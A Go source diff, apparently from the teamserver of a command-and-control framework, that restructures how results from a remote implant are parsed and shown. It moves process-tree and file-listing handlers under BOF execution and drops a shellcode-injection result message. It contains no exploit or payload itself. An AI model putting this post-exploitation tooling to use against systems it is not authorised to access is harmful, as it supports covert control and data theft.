@@ -3018,381 +2012,6 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 				commandId := int16(cmd_packer.ParseInt16())
 				switch commandId {
 
-				case TASK_PROC:
-					if cmd_packer.CheckPacker([]string{"byte"}) {
-						subCommandId := int8(cmd_packer.ParseInt8())
-						switch subCommandId {
-
-						case PROC_PWSH:
-							if cmd_packer.CheckPacker([]string{"int", "int"}) {
-								pid := cmd_packer.ParseInt32()
-								tid := cmd_packer.ParseInt32()
-
-								task.Message = fmt.Sprintf("Process with PID %v (TID %v) started", pid, tid)
-
-								if cmd_packer.CheckPacker([]string{"array"}) {
-									task.ClearText = ConvertCpToUTF8(string(cmd_packer.ParseString()), agentData.OemCP)
-								}
-							}
-							break
-
-						case PROC_RUN:
-							if cmd_packer.CheckPacker([]string{"int", "int"}) {
-
-								pid := cmd_packer.ParseInt32()
-								tid := cmd_packer.ParseInt32()
-
-								task.Message = fmt.Sprintf("Process with PID %v (TID %v) started", pid, tid)
-
-								if cmd_packer.CheckPacker([]string{"array"}) {
-									task.ClearText = ConvertCpToUTF8(string(cmd_packer.ParseString()), agentData.OemCP)
-								}
-							}
-							break
-
-						case PROC_LIST:
-
-							type ps_data struct {
-								fullpath  string
-								imagename string
-								cmdline   string
-								pid       uint
-								ppid      uint
-								handles   uint
-								sessid    uint
-								threads   uint
-								user      string
-								arch      string
-							}
-							var ps_data_list []ps_data
-
-							for cmd_packer.CheckPacker([]string{"array", "array", "array", "int", "int", "int", "int", "int", "array", "int"}) {
-								ps_item := ps_data{
-									fullpath:  ConvertCpToUTF8(cmd_packer.ParseString(), agentData.ACP),
-									imagename: ConvertCpToUTF8(cmd_packer.ParseString(), agentData.ACP),
-									cmdline:   ConvertCpToUTF8(cmd_packer.ParseString(), agentData.ACP),
-									pid:       cmd_packer.ParseInt32(),
-									ppid:      cmd_packer.ParseInt32(),
-									handles:   cmd_packer.ParseInt32(),
-									sessid:    cmd_packer.ParseInt32(),
-									threads:   cmd_packer.ParseInt32(),
-									user:      ConvertCpToUTF8(cmd_packer.ParseString(), agentData.ACP),
-								}
-								is64 := cmd_packer.ParseInt32()
-								if is64 == 0 {
-									ps_item.arch = "x64"
-								} else {
-									ps_item.arch = "x86"
-								}
-
-								ps_data_list = append(ps_data_list, ps_item)
-							}
-
-							var proclist []ax.ListingProcessDataWin
-
-							if len(ps_data_list) == 0 {
-								errorCode := packer.ParseInt32()
-								task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, win32ErrorCodes[errorCode])
-								task.MessageType = MESSAGE_ERROR
-
-							} else {
-								contextMaxSize := 10
-								processMaxSize := 20
-
-								for _, item := range ps_data_list {
-									procData := ax.ListingProcessDataWin{
-										Pid:         item.pid,
-										Ppid:        item.ppid,
-										SessionId:   item.sessid,
-										ProcessName: item.imagename,
-										Arch:        item.arch,
-									}
-
-									if item.user != "-" {
-										procData.Context = item.user
-
-										if len(procData.Context) > contextMaxSize {
-											contextMaxSize = len(procData.Context)
-										}
-									}
-
-									if len(procData.ProcessName) > processMaxSize {
-										processMaxSize = len(procData.ProcessName)
-									}
-
-									proclist = append(proclist, procData)
-								}
-
-								type TreeProc struct {
-									Data     ps_data
-									Children []*TreeProc
-								}
-
-								procMap := make(map[uint]*TreeProc)
-								var roots []*TreeProc
-
-								for _, proc := range ps_data_list {
-									node := &TreeProc{Data: proc}
-									procMap[proc.pid] = node
-								}
-
-								for _, node := range procMap {
-									if node.Data.ppid == 0 || node.Data.pid == node.Data.ppid {
-										roots = append(roots, node)
-									} else if parent, ok := procMap[node.Data.ppid]; ok {
-										parent.Children = append(parent.Children, node)
-									} else {
-										roots = append(roots, node)
-									}
-								}
-
-								sort.Slice(roots, func(i, j int) bool {
-									return roots[i].Data.pid < roots[j].Data.pid
-								})
-
-								maxTreeDepth := 0
-
-								var sortChildren func(node *TreeProc, depth int) int
-								sortChildren = func(node *TreeProc, depth int) int {
-									if depth > maxTreeDepth {
-										maxTreeDepth = depth
-									}
-
-									sort.Slice(node.Children, func(i, j int) bool {
-										return node.Children[i].Data.pid < node.Children[j].Data.pid
-									})
-
-									for _, child := range node.Children {
-										sortChildren(child, depth+1)
-									}
-									return maxTreeDepth
-								}
-								for _, root := range roots {
-									sortChildren(root, 1) // стартовая глубина = 1
-								}
-
-								format := fmt.Sprintf(" %%-5v   %%-5v   %%-7v   %%-7v   %%-7v   %%-5v   %%-%vv   %%v", contextMaxSize)
-								OutputText := fmt.Sprintf(format, "PID", "PPID", "Handles", "Threads", "Session", "Arch", "Context", "Process")
-								OutputText += fmt.Sprintf("\n"+format, "---", "----", "-------", "-------", "-------", "----", "-------", "-------")
-
-								var lines []string
-
-								var formatTree func(node *TreeProc, prefix string, isLast bool)
-								formatTree = func(node *TreeProc, prefix string, isLast bool) {
-									branch := "├─ "
-									if isLast {
-										branch = "└─ "
-									}
-									treePrefix := prefix + branch
-									data := node.Data
-
-									line := fmt.Sprintf(format, data.pid, data.ppid, data.handles, data.threads, data.sessid, data.arch, data.user, treePrefix+data.imagename)
-									lines = append(lines, line)
-
-									childPrefix := prefix
-									if isLast {
-										childPrefix += "    "
-									} else {
-										childPrefix += "│   "
-									}
-
-									for i, child := range node.Children {
-										formatTree(child, childPrefix, i == len(node.Children)-1)
-									}
-								}
-
-								for i, root := range roots {
-									formatTree(root, "", i == len(roots)-1)
-								}
-
-								OutputText += "\n" + strings.Join(lines, "\n")
-								task.Message = "Process list:"
-								task.ClearText = OutputText
-							}
-
-							SyncBrowserProcess(ts, task, proclist)
-
-						case PROC_KILL:
-
-							if cmd_packer.CheckPacker([]string{"int"}) {
-								status := packer.ParseInt32()
-								if status != 0 {
-									task.Message = fmt.Sprintf("Process killed")
-								} else {
-									task.MessageType = MESSAGE_ERROR
-									task.Message = fmt.Sprintf("Process not killed")
-								}
-							}
-
-						default:
-							continue
-						}
-					}
-					break
-
-				case TASK_FS:
-					if cmd_packer.CheckPacker([]string{"byte"}) {
-
-						subCommandId := int8(cmd_packer.ParseInt8())
-						switch subCommandId {
-
-						case FS_LS:
-
-							//				if false == packer.CheckPacker([]string{"int"}) {
-							//					return outTasks
-							//				}
-							//				errorCode := packer.ParseInt32()
-							//				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, win32ErrorCodes[errorCode])
-							//				task.MessageType = MESSAGE_ERROR
-
-							type ls_data struct {
-								filename   string
-								size       uint
-								attrib     uint
-								dir        bool
-								createDate string
-								accessDate string
-								writeDate  string
-							}
-
-							var data_directory []ls_data
-							var data_files []ls_data
-
-							if cmd_packer.CheckPacker([]string{"array"}) {
-
-								rootPath := ConvertCpToUTF8(cmd_packer.ParseString(), agentData.ACP)
-								// rootPath, _ = strings.CutSuffix(rootPath, "\\*")
-
-								for cmd_packer.CheckPacker([]string{"array", "int", "int", "word", "word", "word", "word", "word",
-									"word", "word", "word", "word", "word", "word", "word", "word", "word", "word", "word", "word", "word"}) {
-
-									ls_item := ls_data{
-										filename:   ConvertCpToUTF8(cmd_packer.ParseString(), agentData.ACP),
-										size:       cmd_packer.ParseInt32(),
-										attrib:     cmd_packer.ParseInt32(),
-										dir:        false,
-										createDate: fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d", cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16()),
-										accessDate: fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d", cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16()),
-										writeDate:  fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d", cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16()),
-									}
-
-									if ls_item.filename != "." && ls_item.filename != ".." {
-										if (ls_item.attrib & 0x10) != 0 {
-											ls_item.dir = true
-											data_directory = append(data_directory, ls_item)
-										} else {
-											data_files = append(data_files, ls_item)
-										}
-									}
-								}
-
-								var ui_items []ax.ListingFileDataWin
-
-								data_full := append(data_directory, data_files...)
-								if len(data_full) == 0 {
-									task.Message = fmt.Sprintf("The '%s' directory is EMPTY", rootPath)
-								} else {
-									OutputText := fmt.Sprintf(" %-8s %-14s %-23s %-23s %-23s  %s\n", "Type", "Size", "Created               ", "Last Access           ", "Last Modified         ", "Name")
-									OutputText += fmt.Sprintf(" %-8s %-14s %-23s %-23s %-23s  %s", "----", "---------", "-------------------   ", "-------------------   ", "-------------------   ", "----")
-
-									for _, item := range data_full {
-
-										if item.dir {
-											OutputText += fmt.Sprintf("\n %-8s %-14s %-23s %-23s %-23s  %-8v", "dir", "", item.createDate, item.accessDate, item.writeDate, item.filename)
-										} else {
-											OutputText += fmt.Sprintf("\n %-8s %-14s %-23s %-23s %-23s  %-8v", "", SizeBytesToFormat(int64(item.size)), item.createDate, item.accessDate, item.writeDate, item.filename)
-										}
-
-										t, _ := time.Parse("02/01/2006 15:04:05", item.writeDate)
-
-										fileData := ax.ListingFileDataWin{
-											IsDir:    item.dir,
-											Size:     int64(item.size),
-											Date:     t.Unix(),
-											Filename: item.filename,
-										}
-										ui_items = append(ui_items, fileData)
-									}
-									task.Message = fmt.Sprintf("List of files in the '%s' directory", rootPath)
-									task.ClearText = OutputText
-								}
-								SyncBrowserFiles(ts, task, rootPath, ui_items)
-							}
-
-						case FS_PWD:
-							if cmd_packer.CheckPacker([]string{"array"}) {
-								task.Message = "Current working directory:"
-								task.ClearText = ConvertCpToUTF8(cmd_packer.ParseString(), agentData.ACP)
-							}
-							break
-
-						case FS_CAT:
-							if cmd_packer.CheckPacker([]string{"array"}) {
-								task.Message = "File content:"
-								task.ClearText = ConvertCpToUTF8(cmd_packer.ParseString(), agentData.ACP)
-							}
-							break
-
-						case FS_CD:
-							if cmd_packer.CheckPacker([]string{"int"}) {
-								if cmd_packer.ParseInt32() == 0 {
-									task.Message = "Directory does not changed"
-									task.MessageType = MESSAGE_ERROR
-								} else {
-									task.Message = "Directory successfully changed"
-								}
-							}
-							break
-
-						case FS_MOVE:
-							if cmd_packer.CheckPacker([]string{"int"}) {
-								if cmd_packer.ParseInt32() == 0 {
-									task.Message = "File does not moved"
-									task.MessageType = MESSAGE_ERROR
-								} else {
-									task.Message = "File successfully moved"
-								}
-							}
-							break
-
-						case FS_COPY:
-							if cmd_packer.CheckPacker([]string{"int"}) {
-								if cmd_packer.ParseInt32() == 0 {
-									task.Message = "File does not copied"
-									task.MessageType = MESSAGE_ERROR
-								} else {
-									task.Message = "File successfully copied"
-								}
-							}
-							break
-
-						case FS_RM:
-							if cmd_packer.CheckPacker([]string{"int"}) {
-								if cmd_packer.ParseInt32() == 0 {
-									task.Message = "File does not removed"
-									task.MessageType = MESSAGE_ERROR
-								} else {
-									task.Message = "File successfully removed"
-								}
-							}
-							break
-
-						case FS_MKDIR:
-							if cmd_packer.CheckPacker([]string{"int"}) {
-								if cmd_packer.ParseInt32() == 0 {
-									task.Message = "Directory does not created"
-									task.MessageType = MESSAGE_ERROR
-								} else {
-									task.Message = "Directory successfully created"
-								}
-							}
-							break
-
-						default:
-							continue
-						}
-					}
-					break
 				case TASK_JOB:
 					jobCount := cmd_packer.ParseInt32()
 
@@ -3659,11 +2278,259 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 					task.Message = "Configuration changed\n"
 					break
 
-				case TASK_SCINJECT:
-					task.Message = "Shellcode injected\n"
-					break
 
 				case TASK_EXEC_BOF:
+					cmd_id := cmd_packer.ParseInt32()
+					if cmd_id != 0 {
+						switch int(cmd_id) {
+						case FS_LIST:
+							if ! cmd_packer.CheckPacker([]string{"array"}) {
+								break
+							}
+							
+							root_path := ConvertWCharBytesToUTF8(cmd_packer.ParseBytes())
+							
+							type ls_data struct {
+								filename   string
+								size       uint
+								attrib     uint
+								dir        bool
+								createDate string
+								accessDate string
+								writeDate  string
+							}
+
+							var data_directory []ls_data
+							var data_files []ls_data
+
+							for cmd_packer.CheckPacker([]string{
+								"array", "int", "int", "word", "word", "word", "word", "word",
+								"word", "word", "word", "word", "word", "word", "word", "word",
+								"word", "word", "word", "word", "word"}) {
+								
+								filename := ConvertWCharBytesToUTF8(cmd_packer.ParseBytes())
+								
+								ls_item := ls_data{
+									filename:   filename,
+									size:       cmd_packer.ParseInt32(),
+									attrib:     cmd_packer.ParseInt32(),
+									dir:        false,
+									createDate: fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d", 
+										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), 
+										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16()),
+									accessDate: fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d", 
+										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), 
+										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16()),
+									writeDate: fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d", 
+										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), 
+										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16()),
+								}
+								
+								if ls_item.filename != "." && ls_item.filename != ".." {
+									if (ls_item.attrib & 0x10) != 0 {
+										ls_item.dir = true
+										data_directory = append(data_directory, ls_item)
+									} else {
+										data_files = append(data_files, ls_item)
+									}
+								}
+							}
+							
+							data_full := append(data_directory, data_files...)
+							
+							var ui_items []ax.ListingFileDataWin
+							
+							if len(data_full) == 0 {
+								task.Message = fmt.Sprintf("The '%s' directory is EMPTY", root_path)
+								task.MessageType = MESSAGE_INFO
+							} else {
+								OutputText := fmt.Sprintf(" %-8s %-14s %-23s %-23s %-23s  %s\n", 
+									"Type", "Size", "Created", "Last Access", "Last Modified", "Name")
+								OutputText += fmt.Sprintf(" %-8s %-14s %-23s %-23s %-23s  %s", 
+									"----", "---------", "-------------------", "-------------------", "-------------------", "----")
+								
+								for _, item := range data_full {
+									if item.dir {
+										OutputText += fmt.Sprintf("\n %-8s %-14s %-23s %-23s %-23s  %s", 
+											"dir", "", item.createDate, item.accessDate, item.writeDate, item.filename)
+									} else {
+										OutputText += fmt.Sprintf("\n %-8s %-14s %-23s %-23s %-23s  %s", 
+											"", SizeBytesToFormat(int64(item.size)), item.createDate, item.accessDate, item.writeDate, item.filename)
+									}
+									
+									t, _ := time.Parse("02/01/2006 15:04:05", item.writeDate)
+									
+									fileData := ax.ListingFileDataWin{
+										IsDir:    item.dir,
+										Size:     int64(item.size),
+										Date:     t.Unix(),
+										Filename: item.filename,
+									}
+									ui_items = append(ui_items, fileData)
+								}
+								
+								task.Message = fmt.Sprintf("List of files in the '%s' directory", root_path)
+								task.ClearText = OutputText
+								task.MessageType = MESSAGE_SUCCESS
+							}
+							
+							SyncBrowserFiles(ts, task, root_path, ui_items)
+
+						case PROC_LIST:
+							type ps_data struct {
+								imagename string
+								pid       uint
+								ppid      uint
+								sessionid uint
+								user      string
+								arch      string
+							}
+
+							var ps_data_list []ps_data
+
+							for cmd_packer.CheckPacker([]string{"array", "int", "int", "int", "array", "int"}) {
+								ps_item := ps_data{
+									imagename: ConvertCpToUTF8(ConvertWCharBytesToString(cmd_packer.ParseBytes()), agentData.ACP),
+									pid:       cmd_packer.ParseInt32(),
+									ppid:      cmd_packer.ParseInt32(),
+									sessionid: cmd_packer.ParseInt32(),
+									user:      ConvertCpToUTF8(ConvertWCharBytesToString(cmd_packer.ParseBytes()), agentData.ACP),
+								}
+
+								isx64 := cmd_packer.ParseInt32()
+								if isx64 == 0 {
+									ps_item.arch = "x64"
+								} else {
+									ps_item.arch = "x86"
+								}
+
+								ps_data_list = append(ps_data_list, ps_item)
+
+								fmt.Printf("")
+							}
+
+							var proclist []ax.ListingProcessDataWin
+
+							if len( ps_data_list ) > 0 {
+								ctx_max_size := 10
+								ps_max_size  := 20
+
+								for _, item := range ps_data_list {
+									proc_data := ax.ListingProcessDataWin{
+										Pid:         item.pid,
+										Ppid:        item.ppid,
+										SessionId:   item.sessionid,
+										ProcessName: item.imagename,
+										Arch:        item.arch,
+									}
+
+									if item.user != "N\\A" {
+										proc_data.Context = item.user
+
+										if len( proc_data.Context ) > ctx_max_size {
+											ctx_max_size = len( proc_data.Context )
+										}
+									}
+
+									if len( proc_data.ProcessName ) > ps_max_size {
+										ps_max_size = len( proc_data.ProcessName )
+									}
+
+									proclist = append( proclist, proc_data )
+								}
+
+								type TreeProc struct {
+									Data     ps_data
+									Children []*TreeProc
+								}
+
+								procMap := make(map[uint]*TreeProc)
+								var roots []*TreeProc
+
+								for _, proc := range ps_data_list {
+									node := &TreeProc{Data: proc}
+									procMap[proc.pid] = node
+								}
+
+								for _, node := range procMap {
+									if node.Data.ppid == 0 || node.Data.pid == node.Data.ppid {
+										roots = append(roots, node)
+									} else if parent, ok := procMap[node.Data.ppid]; ok {
+										parent.Children = append( parent.Children, node )
+									} else {
+										roots = append( roots, node ) 
+									}
+								}
+
+								sort.Slice(roots, func(i, j int) bool {
+									return roots[i].Data.pid < roots[j].Data.pid
+								})
+
+								var sortChildren func(node *TreeProc)
+								sortChildren = func(node *TreeProc) {
+									sort.Slice(node.Children, func(i, j int) bool {
+										return node.Children[i].Data.pid < node.Children[j].Data.pid
+									})
+									for _, child := range node.Children {
+										sortChildren(child)
+									}
+								}
+								for _, root := range roots {
+									sortChildren(root)
+								}
+
+								format := fmt.Sprintf(" %%-5v   %%-5v   %%-7v   %%-5v   %%-%vv   %%v", ctx_max_size)
+								OutputText := fmt.Sprintf(format, "PID", "PPID", "Session", "Arch", "Context", "Process")
+								OutputText += fmt.Sprintf("\n"+format, "---", "----", "-------", "----", "-------", "-------")
+
+								var lines []string
+
+								var formatTree func(node *TreeProc, prefix string, isLast bool)
+								formatTree = func(node *TreeProc, prefix string, isLast bool) {
+									branch := "├─ "
+									if isLast {
+										branch = "└─ "
+									}
+									treePrefix := prefix + branch
+									data := node.Data
+
+									line := fmt.Sprintf(format, data.pid, data.ppid, data.sessionid, data.arch, data.user, treePrefix+data.imagename)
+									lines = append(lines, line)
+
+									childPrefix := prefix
+									if isLast {
+										childPrefix += "    "
+									} else {
+										childPrefix += "│   "
+									}
+
+									for i, child := range node.Children {
+										formatTree(child, childPrefix, i == len(node.Children)-1)
+									}
+								}
+
+								for i, root := range roots {
+									formatTree(root, "", i == len(roots)-1)
+								}
+
+								OutputText += "\n" + strings.Join(lines, "\n")
+
+								fmt.Printf("output text:\n%s", OutputText)
+
+								task.Message = "Process list:"
+								task.ClearText = OutputText
+								task.Completed = true
+							}
+
+							SyncBrowserProcess(ts, task, proclist)
+							break
+						case PROC_RUN:					
+						// case DOTNET_INLINE:
+						// case DOTNET_FORK:		
+						// case REFLECT_INLINE:					
+						// case REFLECT_FORK:
+						}
+					}
 					task.Completed = true
 
 				case TASK_SOCKS:
@@ -3843,7 +2710,6 @@ RET:
 
 func TunnelWriteUDP(channelId int, data []byte) ([]byte, error) {
 	return nil, errors.New("Function UDP Tunnel not supported")
-
 }
 
 func TunnelClose(channelId int) ([]byte, error) {
